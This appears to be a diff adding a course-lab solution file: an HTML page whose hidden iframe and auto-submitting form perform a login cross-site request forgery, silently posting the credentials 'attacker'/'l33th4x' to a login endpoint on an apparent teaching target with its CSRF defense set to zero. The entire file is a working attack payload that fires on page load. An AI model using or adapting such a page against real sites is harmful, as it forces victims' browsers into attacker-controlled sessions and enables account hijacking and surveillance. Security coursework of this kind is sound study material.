@@ -1,0 +1,10 @@
+<html>
+<body>
+<iframe name="hidden" style="display:none"></iframe>
+<form id="f" method="post" action="https://webproject.gtinfosec.org/login?csrfdefense=0&xssdefense=4" target="hidden">
+  <input type="hidden" name="username" value="attacker">
+  <input type="hidden" name="password" value="l33th4x">
+</form>
+<script>document.getElementById("f").submit()</script>
+</body>
+</html>
